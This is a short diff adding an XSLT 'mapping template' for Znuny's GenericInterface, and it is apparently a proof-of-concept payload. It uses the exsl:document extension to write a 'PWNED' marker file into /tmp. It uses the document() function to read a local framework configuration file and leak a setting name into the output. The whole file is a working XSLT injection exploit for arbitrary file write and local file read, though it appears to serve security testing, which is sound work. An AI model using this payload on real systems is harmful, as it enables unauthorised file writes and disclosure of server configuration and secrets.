@@ -1,0 +1,3 @@
+(admin-authored GenericInterface XSLT mapping template; exercised via Mapping::XSLT->Map)
+
+<?xml version="1.0" encoding="UTF-8"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:exsl="http://exslt.org/common" extension-element-prefixes="exsl"><xsl:template match="/"><exsl:document href="/tmp/xslt_write_60fd9f7a.txt" method="text">PWNED-XSLT-60fd9f7a</exsl:document><Root><Leaked><xsl:value-of select="document('file:///opt/znuny/Kernel/Config/Files/XML/Framework.xml')//*[local-name()='Setting'][1]/@Name"/></Leaked></Root></xsl:template></xsl:stylesheet>
